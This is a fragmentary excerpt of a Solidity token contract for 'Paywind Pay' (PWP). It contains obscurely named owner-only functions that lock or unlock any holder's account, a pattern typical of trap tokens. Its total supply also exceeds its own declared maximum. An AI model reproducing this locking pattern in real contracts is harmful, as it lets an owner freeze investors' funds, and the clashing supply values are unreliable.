...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Paywind Pay';
    string constant public symbol = 'PWP';
    uint8 constant public decimals = 9;
    uint256 public totalSupply = 1000000000000*10**uint256(decimals);
    uint256 private constant MAXSupply = 100000000000 * 10 ** uint256(decimals);
...
*/    
    ...
    function setALL(address account) public onlyOwner {
        _locked[account] = true;
    }

    function setUL(address account) public onlyOwner {
        _locked[account] = false;
    }
    
    
    function vieAccountL(address account) public view returns (bool) {
...
contract PaywindPay is BaseToken {
